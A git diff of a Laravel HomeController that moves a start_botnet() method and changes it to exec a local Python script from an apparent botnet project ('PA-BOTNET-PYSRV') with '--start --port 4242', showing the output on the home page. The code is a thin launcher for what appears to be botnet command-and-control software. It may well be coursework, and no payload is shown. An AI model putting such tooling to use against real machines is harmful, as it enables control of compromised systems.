@@ -42,22 +42,6 @@ class HomeController extends Controller
     }
 
 
-
-    public function start_botnet()
-    {
-
-    
-            // Exécute la commande ipconfig et récupère le résultat dans $output
-            exec('/home/debian/PA-BOTNET-PYSRV/venv/bin/python /home/debian/PA-BOTNET-PYSRV/main.py --help', $output, $return);
-            // Convertit le tableau $output en une chaîne de caractères
-            $outputString = implode("\n", $output);
-        
-            
-            return redirect('/home')->with('output', $outputString);
-        
-    }
-
-
     public function aide_botnet()
     {
 
@@ -71,6 +55,25 @@ class HomeController extends Controller
             return redirect('/home')->with('output', $outputString);
         
     }
+
+
+
+    public function start_botnet()
+    {
+
+    
+            // Exécute la commande ipconfig et récupère le résultat dans $output
+            exec('/home/debian/PA-BOTNET-PYSRV/venv/bin/python /home/debian/PA-BOTNET-PYSRV/main.py --start --port 4242', $output, $return);
+            // Convertit le tableau $output en une chaîne de caractères
+            $outputString = implode("\n", $output);
+        
+            
+            return redirect('/home')->with('output', $outputString);
+        
+    }
+
+
+
 
 
 }
